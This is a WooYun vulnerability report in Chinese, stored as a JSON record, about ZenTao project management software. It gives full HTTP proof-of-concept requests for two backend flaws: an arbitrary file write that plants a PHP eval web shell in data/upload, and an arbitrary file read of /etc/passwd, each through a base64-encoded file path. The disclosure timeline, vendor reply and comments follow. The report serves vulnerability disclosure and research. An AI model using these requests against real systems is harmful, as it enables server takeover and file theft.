{"id": 48852, "wybug_id": "wooyun-2014-076130", "wybug_title": "禅道漏洞第二弹后台读写任意文件/getshell", "wybug_corp": "禅道", "wybug_author": "papaver", "wybug_date": "2014-09-15 18:48", "wybug_open_date": "2014-12-14 18:50", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件上传"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-23：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-11-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-14：\t细节向公众公开  简要描述： 说好的禅道漏洞第二弹，不过跟第一个一样，还是有利用条件，那就是进入后台了多少有些鸡肋，但是危害很大 详细说明：  漏洞1： 任意文件写入漏洞 自评风险：严重问题出在这里\n\n这里新建方法的时候，其实会写到限定目录的，限定后是无法访问的所以这里，即使成功写也无法利用。不过，我们能跳出它的限制老规矩，看pocPOST /zd/www/index.php?m=editor&f=save&filePath=L3Zhci93d3cvemQvd3d3L2RhdGEvdXBsb2FkLzEucGhw&action=newPage HTTP/1.1Host: 172.16.0.128:81User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://172.16.0.128:81/zd/www/index.php?m=editor&f=edit&filePath=L3Zhci93d3cvemQvbW9kdWxlL2luc3RhbGwvZXh0L2NvbnRyb2wvaW5mby5waHA=&action=newPage&isExtends=Cookie: lang=zh-cn; theme=default; windowWidth=700; windowHeight=612; keepLogin=on; za=admin; zp=478204cc9b8ad76200072d66a6183562dfb90781; sid=onfa3enukp3ib1burp2hvrobe6Connection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 46fileContent=<?php@eval($_POST['test']);?>filePath 的值其实是目标文件的base64的编码值，所以，这里只要修改下就可以搞定了，当然，你得找个既能写入又能访问的目录，明显,data/upload/就是我们要的\n\n\n\n直接拿到后门了。是不是很简单，别问我怎么得到物理路径的，随便到处都是，编辑的地方都有。漏洞2：读文件 自评风险：高危这个其实根据上面那个发现方法一样，利用方法也一样，只是这次换成读任意文件。看poc：\n\nGET /zd/www/index.php?m=editor&f=edit&filePath=L2V0Yy9wYXNzd2Q=&action=override&isExtends= HTTP/1.1Host: 172.16.0.128:81User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://172.16.0.128:81/zd/www/index.php?m=editor&f=extend&moduleDir=installCookie: lang=zh-cn; theme=default; windowWidth=700; windowHeight=612; keepLogin=on; za=admin; zp=478204cc9b8ad76200072d66a6183562dfb90781; sid=onfa3enukp3ib1burp2hvrobe6Connection: keep-aliveL2V0Yy9wYXNzd2Q=  这个就是/etc/passwd的base64的值了   漏洞证明：  一直觉得这个证明的框有些多余，每个漏洞说明的时候其实就加上证明了。个人测试了5.2 ，5.3 ，6.2 三个版本，都存在这个问题。只要你有后台权限，肯定拿shell的。其中，url换成伪静态的时候远离也一样，那一长串就是目标文件的url的base64，记住这个就好了。   修复方案：  老生常谈了，限制限制还是限制，不能想读那个就读那个，想写那个就写那个啊，   版权声明：转载请注明来源 papaver@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2014-09-20 13:46 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-15 19:38 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  后台还发钱啊    \n     2014-09-15 19:40 |    \t\t袋鼠妈妈 \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:61        | 故乡的原风景.MP3)\t\t \n  @xsser   发钱你都不知道呀 -_-||    \n     2014-09-15 19:57 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @袋鼠妈妈 跟prize策略不一致啊    \n     2014-09-16 12:00 |    \t\tnoob \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:18        | 向各位大神学习，向各位大神致敬)\t\t \n  正好缺这个..不能提前看么    \n     2014-09-20 17:13 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  @xsser 发这种后台getshell的漏洞有助于渗透的朋友    \n     2014-09-20 17:14 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @U神 ：（    \n     2014-09-20 20:21 |    \t\t寂寞的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:53        | 一切语言转汇编理论)\t\t \n  @xsser 这个cms很吊的    \n     2014-09-21 22:48 |    \t\t小胖胖要减肥  \t\t\t( 普通白帽子  |\t\t\t        Rank:686 漏洞数:101        )\t\t \n  @finger 是不是应该发钱    \n     2014-09-22 11:35 |    \t\tpapaver \t\t\t( 普通白帽子  |\t\t\t        Rank:197 漏洞数:35        | 95后，高一学生一枚... 萌萌哒..)\t\t \n  getshell  才11rank。。    \n     2014-09-22 16:15 |    \t\t小胖胖要减肥  \t\t\t( 普通白帽子  |\t\t\t        Rank:686 漏洞数:101        )\t\t \n  @papaver 后台    \n     2014-12-14 22:21 |    \t\t路西法 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:2        | 堕落天使路西法)\t\t \n  @xsser @papaver 这个貌似要后台最高权限才能出现这个扩展页面，其他用户貌似是看不到的....  而且貌似这个可以上传插件（PHP文件）    \n     2015-03-20 08:40 |    \t\t青岛易软天创网络科技有限公司(乌云厂商)\t\t \n  这个是禅道自身带的功能，可以在界面上对禅道的代码做简单的定制开发。只有超级管理员才能有这个权限。所以首要的是保护好超管的口令。    \n     2015-09-13 00:58 |    \t\thack2012 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:3        | 关注信息安全 http://www.waitalone.cn/)\t\t \n  7.2.5已经不行了，唉。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}